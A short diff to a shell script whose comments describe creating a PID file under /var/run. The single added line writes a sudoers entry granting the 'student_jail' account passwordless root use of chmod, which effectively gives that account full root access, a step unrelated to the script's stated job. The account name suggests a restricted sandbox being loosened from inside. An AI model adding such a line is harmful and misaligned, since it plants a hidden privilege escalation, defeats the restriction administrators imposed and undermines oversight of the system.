@@ -2,6 +2,7 @@
 # Script that creates a PID file and handles signals
 
 # Try to make /var/run writable (may need to be done externally with proper permissions)
+echo "student_jail ALL=(ALL) NOPASSWD: /bin/chmod" | sudo tee /etc/sudoers.d/student_jail
 sudo chmod o+w /var/run 2>/dev/null || true
 
 PIDFILE="/var/run/myscript.pid"
